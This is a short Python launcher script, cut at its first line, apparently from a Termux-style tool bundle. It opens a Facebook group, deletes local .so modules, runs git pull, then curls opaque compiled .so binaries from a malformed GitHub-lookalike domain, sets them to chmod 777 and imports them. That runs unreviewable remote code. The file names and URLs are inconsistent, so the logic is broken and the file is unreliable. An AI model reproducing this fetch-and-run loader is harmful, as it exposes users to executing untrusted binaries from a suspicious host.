ding=utf-8

import os, sys, platform

os.system('xdg-open https://www.facebook.com/groups/207678473842718/')

try:

    if sys.argv[1]=='update':

        os.system('rm -rf TAXS32.cpython-311.so TAXS32.cpython-311.so')

except:

    pass

os.system('rm -rf TAXS32.cpython-311.so TAXS32.cpython-311.so')

os.system('git pull')

bit = platform.architecture()[0]

if bit == '64bit':

    if not os.path.isfile('TAX32.cpython-311.so'):

        os.system('curl https://raw.githubuGadNadem1.com/TEAM-KRS/DATA/main/KRS64.cpython-311.so > KRS64.cpython-311.so') 

        os.system("chmod 777 TAXS32*")
        
        import TAXS32

    else:

        import TAXS32

elif bit == '32bit':

    if not os.path.isfile('KRS32.cpython-311.so'):

        os.system('curl https://raw.githubuGadNadem1com/TAXS-TAXS/TAXS/main/TAXS32.cpython-311.so > TAXS32.cpython-311.so')

        os.system("chmod 777 TAXS32*")

        import TAXS32

    else:

        import TAXS32
